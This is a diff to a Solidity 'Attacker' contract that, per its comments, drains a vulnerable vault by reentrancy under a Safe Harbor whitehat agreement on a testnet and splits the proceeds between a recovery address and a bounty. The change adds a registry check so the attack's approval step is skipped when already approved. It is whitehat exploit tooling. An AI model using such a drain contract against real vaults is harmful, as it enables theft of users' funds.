@@ -1,6 +1,8 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
 
+import {IAttackRegistry} from "./interfaces/IAttackRegistry.sol";
+
 interface IVulnerableVault {
     function deposit(uint256 amount) external;
     function withdrawAll() external;
@@ -63,12 +65,16 @@ contract Attacker {
     ///         drain the vault via reentrancy and split the proceeds per Safe Harbor terms.
     /// @param agreement The Safe Harbor agreement to put UNDER_ATTACK.
     /// @param moderator The permissionless testnet moderator (pass address(0) to skip approval).
-    function attack(address agreement, address moderator) external {
+    /// @param registry  The AttackRegistry, used to check whether approval is still needed
+    ///                  (pass address(0) to always attempt approval).
+    function attack(address agreement, address moderator, address registry) external {
         require(msg.sender == OWNER, "only owner");
 
         // Open the contract for attack. On testnet the DAO role is a permissionless
-        // mock moderator, so the whitehat's own transaction can approve it.
-        if (moderator != address(0)) {
+        // mock moderator, so the whitehat's own transaction can approve it. Skip the
+        // approval when the agreement isn't ATTACK_REQUESTED — it may already be
+        // UNDER_ATTACK (approved out-of-band), and re-approving reverts InvalidState.
+        if (moderator != address(0) && _needsApproval(agreement, registry)) {
             IMockRegistryModerator(moderator).approveAttack(agreement);
         }
 
@@ -94,5 +100,13 @@ contract Attacker {
 
         TOKEN.transfer(RECOVERY_ADDRESS, recovered - bounty);
         TOKEN.transfer(BENEFICIARY, bounty + SEED_AMOUNT);
+    }
+
+    /// @dev True only when the agreement still needs approval (state ATTACK_REQUESTED).
+    ///      When `registry` is address(0) we can't check, so default to attempting approval.
+    function _needsApproval(address agreement, address registry) private view returns (bool) {
+        if (registry == address(0)) return true;
+        return IAttackRegistry(registry).getAgreementState(agreement)
+            == IAttackRegistry.ContractState.ATTACK_REQUESTED;
     }
 }
